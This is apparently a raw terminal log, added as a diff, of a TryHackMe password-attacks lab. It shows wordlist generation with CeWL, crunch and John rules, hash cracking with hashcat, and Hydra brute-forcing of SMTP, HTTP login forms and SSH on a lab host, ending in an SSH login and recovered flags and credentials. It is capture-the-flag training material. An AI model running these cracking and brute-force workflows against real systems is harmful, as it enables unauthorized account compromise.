@@ -1,0 +1,528 @@
+┌──(kali㉿kali)-[~/Documents/TryHackMe/PasswordAttacks]
+└─$ cewl -w cewl.txt -m 5 https://clinic.thmredteam.com/
+CeWL 5.5.2 (Grouping) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
+            
+┌──(kali㉿kali)-[~/Documents/TryHackMe/PasswordAttacks]
+└─$ head cewl.txt                         
+Medical
+Elite
+email
+protected
+Health
+Research
+Welcome
+Doctors
+THUMB
+Oxytocin
+
+┌──(kali㉿kali)-[~/Documents/TryHackMe/PasswordAttacks]
+└─$ python3 /opt/username_generator/username_generator.py -h         
+usage: username_generator.py [-h] -w wordlist [-u]
+
+Python script to generate user lists for bruteforcing!
+
+optional arguments:
+  -h, --help            show this help message and exit
+  -w wordlist, --wordlist wordlist
+                        Specify path to the wordlist
+  -u, --uppercase       Also produce uppercase permutations. Disabled by default
+            
+┌──(kali㉿kali)-[~/Documents/TryHackMe/PasswordAttacks]
+└─$ echo "John Smith" > users.lst
+             
+┌──(kali㉿kali)-[~/Documents/TryHackMe/PasswordAttacks]
+└─$ python3 /opt/username_generator/username_generator.py -w users.lst 
+john
+smith
+j.smith
+j-smith
+j_smith
+j+smith
+jsmith
+smithjohn
+
+┌──(kali㉿kali)-[~/Documents/TryHackMe/PasswordAttacks]
+└─$ crunch -h         
+crunch version 3.6
+
+Crunch can create a wordlist based on criteria you specify.  The output from crunch can be sent to the screen, file, or to another program.
+
+Usage: crunch <min> <max> [options]
+where min and max are numbers
+
+Please refer to the man page for instructions and examples on how to use crunch.
+
+┌──(kali㉿kali)-[~/Documents/TryHackMe/PasswordAttacks]
+└─$ python3 /opt/cupp/cupp.py 
+ ___________ 
+   cupp.py!                 # Common
+      \                     # User
+       \   ,__,             # Passwords
+        \  (oo)____         # Profiler
+           (__)    )\   
+              ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]
+                            [ Mebus | https://github.com/Mebus/]
+
+usage: cupp.py [-h] [-i | -w FILENAME | -l | -a | -v] [-q]
+
+Common User Passwords Profiler
+
+optional arguments:
+  -h, --help         show this help message and exit
+  -i, --interactive  Interactive questions for user password profiling
+  -w FILENAME        Use this option to improve existing dictionary, or WyD.pl output to make some pwnsauce
+  -l                 Download huge wordlists from repository
+  -a                 Parse default usernames and passwords directly from Alecto DB. Project Alecto uses purified databases of Phenoelit and CIRT which were
+                     merged and enhanced
+  -v, --version      Show the version of this program.
+  -q, --quiet        Quiet mode (don't print banner)
+
+┌──(kali㉿kali)-[~/Documents/TryHackMe/PasswordAttacks]
+└─$ crunch 2 2 01234abcd -o crunch.txt
+Crunch will now generate the following amount of data: 243 bytes
+0 MB
+0 GB
+0 TB
+0 PB
+Crunch will now generate the following number of lines: 81 
+
+crunch: 100% completed generating output
+
+crunch 5 5 -t 'THM^!' -o tryhackme.txt
+
+┌──(kali㉿kali)-[~/Documents/TryHackMe/PasswordAttacks]
+└─$ haiti 8d6e34f987851aa599257d3831a1af040886842f
+SHA-1 [HC: 100] [JtR: raw-sha1]
+RIPEMD-160 [HC: 6000] [JtR: ripemd-160]
+Double SHA-1 [HC: 4500]
+Haval-160 (3 rounds) [JtR: dynamic_190]
+Haval-160 (4 rounds) [JtR: dynamic_200]
+Haval-160 (5 rounds) [JtR: dynamic_210]
+Tiger-160
+HAS-160
+LinkedIn [HC: 190] [JtR: raw-sha1-linkedin]
+Skein-256(160)
+Skein-512(160)
+MySQL5.x [HC: 300] [JtR: mysql-sha1]
+MySQL4.1 [HC: 300] [JtR: mysql-sha1]
+Umbraco HMAC-SHA1 [HC: 24800]
+           
+┌──(kali㉿kali)-[~/Documents/TryHackMe/PasswordAttacks]
+└─$ hashcat -a 0 -m 100 8d6e34f987851aa599257d3831a1af040886842f /usr/share/wordlists/rockyou.txt 
+hashcat (v6.1.1) starting...
+
+OpenCL API (OpenCL 2.0 pocl 1.8  Linux, None+Asserts, RELOC, LLVM 11.1.0, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+=====================================================================================================================================
+* Device #1: pthread-AMD Ryzen 5 3600XT 6-Core Processor, 5836/5900 MB (2048 MB allocatable), 4MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Applicable optimizers applied:
+* Zero-Byte
+* Early-Skip
+* Not-Salted
+* Not-Iterated
+* Single-Hash
+* Single-Salt
+* Raw-Hash
+
+ATTENTION! Pure (unoptimized) backend kernels selected.
+Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.
+If you want to switch to optimized backend kernels, append -O to your commandline.
+See the above message to find out about the exact limits.
+
+Watchdog: Hardware monitoring interface not found on your system.
+Watchdog: Temperature abort trigger disabled.
+
+Host memory required for this attack: 65 MB
+
+Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344385
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+
+8d6e34f987851aa599257d3831a1af040886842f:sunshine
+                                                 
+Session..........: hashcat
+Status...........: Cracked
+Hash.Name........: SHA1
+Hash.Target......: 8d6e34f987851aa599257d3831a1af040886842f
+Time.Started.....: Tue Dec 14 14:00:03 2021 (0 secs)
+Time.Estimated...: Tue Dec 14 14:00:03 2021 (0 secs)
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:  2021.6 kH/s (0.21ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
+Recovered........: 1/1 (100.00%) Digests
+Progress.........: 4096/14344385 (0.03%)
+Rejected.........: 0/4096 (0.00%)
+Restore.Point....: 0/14344385 (0.00%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidates.#1....: 123456 -> oooooo
+
+Started: Tue Dec 14 13:59:43 2021
+Stopped: Tue Dec 14 14:00:05 2021
+            
+┌──(kali㉿kali)-[~/Documents/TryHackMe/PasswordAttacks]
+└─$ hashcat -a 0 -m 100 8d6e34f987851aa599257d3831a1af040886842f /usr/share/wordlists/rockyou.txt --show
+8d6e34f987851aa599257d3831a1af040886842f:sunshine
+        
+┌──(kali㉿kali)-[~/Documents/TryHackMe/PasswordAttacks]
+└─$ hashcat -a 3 -m 0 e48e13207341b6bffb7fb1622282247b ?d?d?d?d                                         
+hashcat (v6.1.1) starting...
+
+OpenCL API (OpenCL 2.0 pocl 1.8  Linux, None+Asserts, RELOC, LLVM 11.1.0, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+=====================================================================================================================================
+* Device #1: pthread-AMD Ryzen 5 3600XT 6-Core Processor, 5836/5900 MB (2048 MB allocatable), 4MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+
+Applicable optimizers applied:
+* Zero-Byte
+* Early-Skip
+* Not-Salted
+* Not-Iterated
+* Single-Hash
+* Single-Salt
+* Brute-Force
+* Raw-Hash
+
+ATTENTION! Pure (unoptimized) backend kernels selected.
+Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.
+If you want to switch to optimized backend kernels, append -O to your commandline.
+See the above message to find out about the exact limits.
+
+Watchdog: Hardware monitoring interface not found on your system.
+Watchdog: Temperature abort trigger disabled.
+
+Host memory required for this attack: 65 MB
+
+The wordlist or mask that you are using is too small.
+This means that hashcat cannot use the full parallel power of your device(s).
+Unless you supply more work, your cracking speed will drop.
+For tips on supplying more work, see: https://hashcat.net/faq/morework
+
+Approaching final keyspace - workload adjusted.  
+
+e48e13207341b6bffb7fb1622282247b:1337            
+                                                 
+Session..........: hashcat
+Status...........: Cracked
+Hash.Name........: MD5
+Hash.Target......: e48e13207341b6bffb7fb1622282247b
+Time.Started.....: Tue Dec 14 14:02:11 2021 (1 sec)
+Time.Estimated...: Tue Dec 14 14:02:12 2021 (0 secs)
+Guess.Mask.......: ?d?d?d?d [4]
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:    79237 H/s (0.13ms) @ Accel:1024 Loops:10 Thr:1 Vec:8
+Recovered........: 1/1 (100.00%) Digests
+Progress.........: 10000/10000 (100.00%)
+Rejected.........: 0/10000 (0.00%)
+Restore.Point....: 0/1000 (0.00%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-10 Iteration:0-10
+Candidates.#1....: 1234 -> 6764
+
+Started: Tue Dec 14 14:01:53 2021
+Stopped: Tue Dec 14 14:02:13 2021
+          
+┌──(kali㉿kali)-[~/Documents/TryHackMe/PasswordAttacks]
+└─$ hashcat -a 3 -m 0 e48e13207341b6bffb7fb1622282247b ?d?d?d?d --show
+e48e13207341b6bffb7fb1622282247b:1337
+
+┌──(kali㉿kali)-[~/Documents/TryHackMe/PasswordAttacks]
+└─$ cat /usr/share/john/john.conf|grep "List.Rules:" | cut -d"." -f3 | cut -d":" -f2 | cut -d"]" -f1 | awk NF
+JumboSingle
+o1
+o2
+i1
+i2
+o1
+i1
+o2
+i2
+best64
+d3ad0ne
+dive
+InsidePro
+T0XlC
+rockyou-30000
+specific
+ShiftToggle
+Split
+Single
+Extra
+OldOffice
+Single-Extra
+Wordlist
+ShiftToggle
+Multiword
+best64
+UnicodeSubstitution
+Jumbo
+KoreLogic
+T9
+hashcat
+
+┌──(kali㉿kali)-[~/Documents/TryHackMe/PasswordAttacks]
+└─$ john --wordlist=single.lst --rules=THM-Password-Attacks --stdout 
+Using default input encoding: UTF-8
+!password0
+@password0
+#password0
+$password0
+!password1
+@password1
+#password1
+$password1
+!password2
+@password2
+#password2
+$password2
+!password3
+@password3
+#password3
+$password3
+!password4
+@password4
+#password4
+$password4
+!password5
+@password5
+#password5
+$password5
+!password6
+@password6
+#password6
+$password6
+!password7
+@password7
+#password7
+$password7
+!password8
+@password8
+#password8
+$password8
+!password9
+@password9
+#password9
+$password9
+40p 0:00:00:00 100.00% (2021-12-14 14:10) 1333p/s $password9
+
+Az"[0-9][0-9]" ^[!@]
+
+
+┌──(kali㉿kali)-[~]
+└─$ ftp 10.10.253.17
+Connected to 10.10.253.17.
+220 (vsFTPd 3.0.3)
+Name (10.10.253.17:kali): Anonymous
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> pwd
+257 "/" is the current directory
+ftp> ls -la
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxr-xr-x    3 0        116          4096 Oct 12 07:56 .
+drwxr-xr-x    3 0        116          4096 Oct 12 07:56 ..
+drwxr-xr-x    2 111      116          4096 Oct 12 07:58 files
+226 Directory send OK.
+ftp> cd files
+250 Directory successfully changed.
+ftp> ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-rw-r--r--    1 0        0              38 Oct 12 07:58 flag.txt
+226 Directory send OK.
+ftp> get flag.txt
+local: flag.txt remote: flag.txt
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for flag.txt (38 bytes).
+226 Transfer complete.
+38 bytes received in 0.00 secs (10.9597 kB/s)
+ftp> exit
+221 Goodbye.
+                                         
+┌──(kali㉿kali)-[~]
+└─$ cat flag.txt 
+THM{d0abe799f25738ad739c20301aed357b}
+
+┌──(kali㉿kali)-[~/Documents/TryHackMe/PasswordAttacks]
+└─$ sudo nano /usr/share/john/john-local.conf
+
+[List.Rules:THM-Password-Attacks]
+Az"[0-9][0-9]" ^[!@#$]
+                                     
+┌──(kali㉿kali)-[~/Documents/TryHackMe/PasswordAttacks]
+└─$ john --wordlist=cewl.txt --rules=THM-Password-Attacks --stdout > cewlmod.lst
+Using default input encoding: UTF-8
+Press 'q' or Ctrl-C to abort, almost any other key for status
+107600p 0:00:00:00 100.00% (2021-12-14 14:59) 2690Kp/s $Process99
+                                                                                                                                                                                          
+┌──(kali㉿kali)-[~/Documents/TryHackMe/PasswordAttacks]
+└─$ head cewlmod.lst 
+!Medical00
+!Elite00
+!email00
+!protected00
+!Health00
+!Research00
+!Welcome00
+!Doctors00
+!THUMB00
+!Oxytocin00
+
+┌──(kali㉿kali)-[~/Documents/TryHackMe/PasswordAttacks]
+└─$ hydra -l pittman@clinic.thmredteam.com -P cewlmod.lst smtp://10.10.253.17
+Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-12-14 14:59:42
+[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 107600 login tries (l:1/p:107600), ~6725 tries per task
+[DATA] attacking smtp://10.10.253.17:25/
+[ERROR] SMTP LOGIN AUTH, either this auth is disabled or server is not using auth: 454 4.7.0 Temporary authentication failure: Connection lost to authentication server
+
+[ERROR] SMTP LOGIN AUTH, either this auth is disabled or server is not using auth: 454 4.7.0 Temporary authentication failure: Connection lost to authentication server
+
+[ERROR] SMTP LOGIN AUTH, either this auth is disabled or server is not using auth: 454 4.7.0 Temporary authentication failure: Connection lost to authentication server
+
+[ERROR] SMTP LOGIN AUTH, either this auth is disabled or server is not using auth: 454 4.7.0 Temporary authentication failure: Connection lost to authentication server
+
+[25][smtp] host: 10.10.253.17   login: pittman@clinic.thmredteam.com   password: !multidisciplinary00
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-12-14 15:00:39
+                       
+┌──(kali㉿kali)-[~/Documents/TryHackMe/PasswordAttacks]
+└─$ hydra -l phillips -P cewl.txt 10.10.253.17 http-get-form "/login-get/index.php:username=^USER^&password=^PASS^:S=logout.php" -f                                                 255 ⨯
+Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-12-14 15:16:50
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 269 login tries (l:1/p:269), ~17 tries per task
+[DATA] attacking http-get-form://10.10.253.17:80/login-get/index.php:username=^USER^&password=^PASS^:S=logout.php
+[80][http-get-form] host: 10.10.253.17   login: phillips   password: Paracetamol
+[STATUS] attack finished for 10.10.253.17 (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-12-14 15:16:52
+
+THM{33c5d4954da881814420f3ba39772644}
+                                    
+┌──(kali㉿kali)-[~/Documents/TryHackMe/PasswordAttacks]
+└─$ john --wordlist=cewl.txt --rules=Single-Extra --stdout > cewlmod1.lst        
+Using default input encoding: UTF-8
+Press 'q' or Ctrl-C to abort, almost any other key for status
+1400649p 0:00:00:00 100.00% (2021-12-14 15:20) 10774Kp/s multidisciplina
+
+┌──(kali㉿kali)-[~/Documents/TryHackMe/PasswordAttacks]
+└─$ head cewlmod1.lst                                                 
+Medical
+Elite
+email
+protected
+Health
+Research
+Welcome
+Doctors
+THUMB
+Oxytocin
+                                 
+┌──(kali㉿kali)-[~/Documents/TryHackMe/PasswordAttacks]
+└─$ hydra -l burgess -P cewlmod1.lst 10.10.253.17 http-post-form "/login-post/index.php:username=^USER^&password=^PASS^:S=logout.php" -f
+Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-12-14 15:21:05
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 1400649 login tries (l:1/p:1400649), ~87541 tries per task
+[DATA] attacking http-post-form://10.10.253.17:80/login-post/index.php:username=^USER^&password=^PASS^:S=logout.php
+[STATUS] 1055.00 tries/min, 1055 tries in 00:01h, 1399594 to do in 22:07h, 16 active
+[STATUS] 1024.67 tries/min, 3074 tries in 00:03h, 1397575 to do in 22:44h, 16 active
+[80][http-post-form] host: 10.10.253.17   login: burgess   password: OxytocinnicotyxO
+[STATUS] attack finished for 10.10.253.17 (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-12-14 15:25:44
+
+THM{f8e3750cc0ccbb863f2706a3b2933227}
+
+┌──(kali㉿kali)-[~/Documents/TryHackMe/PasswordAttacks]
+└─$ nano seasons.txt                                          
+
+Winter2021
+Spring2021
+Summer2021
+Autumn2021
+Fall2021
+
+┌──(kali㉿kali)-[~/Documents/TryHackMe/PasswordAttacks]
+└─$ sudo nano /usr/share/john/john-local.conf     
+
+[List.Rules:SSH]
+Az"[!@\#\$%^&()_+\-={}|\[\]\\;’:,/\<\>?`~*]"
+
+┌──(kali㉿kali)-[~/Documents/TryHackMe/PasswordAttacks]
+└─$ john --wordlist=seasons.txt --rules=SSH --stdout > SSH.lst
+Using default input encoding: UTF-8
+Press 'q' or Ctrl-C to abort, almost any other key for status
+160p 0:00:00:00 100.00% (2021-12-14 16:48) 5333p/s Fall2021*
+
+┌──(kali㉿kali)-[~/Documents/TryHackMe/PasswordAttacks]
+└─$ hydra -L usernames.txt -P SSH.lst ssh://10.10.253.17 -f 
+Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-12-14 16:48:19
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 800 login tries (l:5/p:160), ~50 tries per task
+[DATA] attacking ssh://10.10.253.17:22/
+[STATUS] 180.00 tries/min, 180 tries in 00:01h, 623 to do in 00:04h, 16 active
+[22][ssh] host: 10.10.253.17   login: burgess   password: Fall2021@
+[STATUS] attack finished for 10.10.253.17 (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-12-14 16:50:16
+         
+┌──(kali㉿kali)-[~/Documents/TryHackMe/PasswordAttacks]
+└─$ ssh burgess@10.10.253.17                 
+The authenticity of host '10.10.253.17 (10.10.253.17)' can't be established.
+ED25519 key fingerprint is SHA256:Jsgv66byrsQvpS/XWYCkGG0opi978lwTlmfNLdWjSyQ.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.253.17' (ED25519) to the list of known hosts.
+burgess@10.10.253.17's password: 
+Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 5.4.0-1058-aws x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Tue Dec 14 21:57:58 UTC 2021
+
+  System load:  0.03               Users logged in:                0
+  Usage of /:   21.2% of 19.32GB   IP address for eth0:            10.10.253.17
+  Memory usage: 37%                IP address for br-mailcow:      172.22.1.1
+  Swap usage:   0%                 IP address for docker0:         172.17.0.1
+  Processes:    144                IP address for br-c0dd1805e8c7: 172.18.0.1
+
+
+ * Canonical Livepatch is available for installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+
+61 packages can be updated.
+8 updates are security updates.
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Tue Nov 16 09:49:44 2021 from 10.8.232.37
+burgess@ip-10-10-253-17:~$ cd /etc
+burgess@ip-10-10-253-17:/etc$ cat flag
+THM{a97a26e86d09388bbea148f4b870277d}
